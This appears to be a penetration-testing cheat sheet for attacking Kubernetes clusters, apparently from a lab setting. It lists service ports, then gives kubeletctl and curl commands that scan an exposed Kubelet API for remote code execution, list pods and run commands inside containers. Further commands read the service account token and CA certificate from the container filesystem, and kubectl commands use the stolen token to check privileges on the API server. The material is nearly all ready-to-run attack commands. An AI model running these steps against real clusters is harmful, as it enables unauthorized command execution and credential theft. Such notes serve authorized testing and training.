
| **Service**             | **TCP Ports**  |
| ----------------------- | -------------- |
| `etcd`                  | `2379`, `2380` |
| `API server`            | `6443`         |
| `Scheduler`             | `10251`        |
| `Controller Manager`    | `10252`        |
| `Kubelet API`           | `10250`        |
| `Read-Only Kubelet API` | `10255`        |
# Kubelet API 
## Available Commands
```shell-session
$ kubeletctl -i --server <IP> scan rce
```
## Extract Pods
```shell-session
$ curl https://<IP>:10250/pods -k | jq .
$ kubeletctl -i --server 10.129.10.11 pods
```
## Execute Commands
```shell-session
$ kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
```
## Extract Tokens
```shell-session
$ kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
## Extract Certificates
```shell-session
$ kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
## List Privileges
Using the token extracted above:
```shell-session
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
# API Server Interaction
```shell-session
$ curl https://10.129.10.11:6443 -k
```

# Privilege Escalation
Obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. Refer [[#Extract Tokens]] and [[#Extract Certificates]].